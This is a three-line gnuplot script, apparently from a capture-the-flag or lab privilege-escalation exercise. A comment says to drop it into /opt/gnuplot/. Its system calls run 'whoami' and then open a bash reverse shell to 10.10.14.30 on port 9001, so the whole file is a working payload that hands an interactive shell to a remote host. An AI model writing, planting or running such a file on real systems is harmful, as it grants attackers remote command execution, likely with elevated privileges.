# put this file under /opt/gnuplot/
system "whoami"
system "bash -c 'bash -i >& /dev/tcp/10.10.14.30/9001 0>&1'"